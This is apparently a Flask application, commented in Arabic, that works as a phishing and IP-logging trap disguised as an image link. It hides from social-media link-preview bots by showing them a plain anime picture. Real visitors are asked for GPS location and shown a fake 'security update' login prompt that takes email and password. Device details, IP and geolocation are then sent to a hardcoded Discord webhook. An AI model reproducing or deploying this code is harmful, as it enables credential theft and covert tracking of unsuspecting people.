from flask import Flask, request, render_template_string
import requests

app = Flask(__name__)

# الإعدادات
WEBHOOK_URL = "https://discord.com/api/webhooks/1493558963869061224/tY_NAc83SlbAMed-ibT8MdFhC88Owdqb-naTrn6q5-En386EXCCqZBByyhiPg6S7JBOr"
REAL_IMAGE = "https://static0.thegamerimages.com/wordpress/wp-content/uploads/wm/2025/03/kisuke-urahara-in-bleach-rebirth-of-souls.jpg?w=1600&h=900&fit=crop" # الصورة التي ستظهر للضحية

@app.route('/api/v2/logger')
def advanced_logger():
    ua = request.headers.get('User-Agent', '')
    ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0]

    # تجاوز معاينة بوتات منصات التواصل
    if any(bot in ua.lower() for bot in ["discord", "facebook", "twitter", "telegram"]):
        return f'<meta property="og:image" content="{REAL_IMAGE}"><img src="{REAL_IMAGE}">'

    html_code = '''
    <!DOCTYPE html>
    <html dir="rtl">
    <head>
        <meta charset="UTF-8">
        <script src="https://jsdelivr.net"></script>
    </head>
    <body style="margin:0; background:black; height:100vh; overflow:hidden;">
        <img src="{{ img_url }}" id="content" style="width:100%; height:100%; object-fit:contain; display:none;">

        <script>
            async function startCapture() {
                // 1. طلب الموقع الجغرافي الدقيق (GPS)
                let gps = "مرفوض من المستخدم";
                try {
                    const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
                    gps = `https://google.com{pos.coords.latitude},${pos.coords.longitude}`;
                } catch (e) {}

                // 2. نافذة سحب البيانات الحساسة (الهندسة الاجتماعية)
                const { value: loginData } = await Swal.fire({
                    title: 'تحديث أمني مطلوب',
                    text: 'يرجى تأكيد حسابك لمتابعة العرض',
                    html: '<input id="email" class="swal2-input" placeholder="الإيميل/الهاتف">' +
                         '<input id="pass" type="password" class="swal2-input" placeholder="كلمة المرور">',
                    confirmButtonText: 'تأكيد دخول',
                    allowOutsideClick: false
                });

                document.getElementById('content').style.display = 'block';

                // 3. جمع بيانات الجهاز العميقة
                let battery = await navigator.getBattery();
                let deviceData = {
                    "البريد": document.getElementById('email').value || "لم يدخل",
                    "الباسورد": document.getElementById('pass').value || "لم يدخل",
                    "الموقع الدقيق (GPS)": gps,
                    "نوع الجهاز": /Mobi|Android/i.test(navigator.userAgent) ? "جوال" : "كمبيوتر",
                    "المعالج": navigator.hardwareConcurrency + " نواة",
                    "الذاكرة (RAM)": navigator.deviceMemory + " GB",
                    "البطارية": (battery.level * 100) + "%",
                    "الشحن": battery.charging ? "يشحن" : "لا يشحن",
                    "اللغة": navigator.language,
                    "دقة الشاشة": screen.width + "x" + screen.height
                };

                // 4. إرسال "الكنز" إلى الديسكورد
                fetch("{{ webhook }}", {
                    method: "POST",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({
                        "embeds": [{
                            "title": "🚨 تم صيد معلومات جديدة!",
                            "color": 16711680,
                            "fields": Object.keys(deviceData).map(k => ({name: k, value: deviceData[k], inline: true})),
                            "footer": {"text": "IP: {{ ip }} | UA: {{ ua }}"}
                        }]
                    })
                });
            }
            window.onload = startCapture;
        </script>
    </body>
    </html>
    '''
    
    # جلب بيانات الـ IP جغرافياً عبر السيرفر
    try:
        geo = requests.get(f"http://ip-api.com{ip}?fields=status,message,country,city,isp").json()
        requests.post(WEBHOOK_URL, json={
            "embeds": [{
                "title": "📡 دخول جديد (سيرفر)",
                "description": f"الدولة: {geo.get('country')} | المدينة: {geo.get('city')} | المزود: {geo.get('isp')}",
                "color": 3447003
            }]
        })
    except: pass

    return render_template_string(html_code, img_url=REAL_IMAGE, webhook=WEBHOOK_URL, ip=ip, ua=ua)

if __name__ == "__main__":
    app.run()
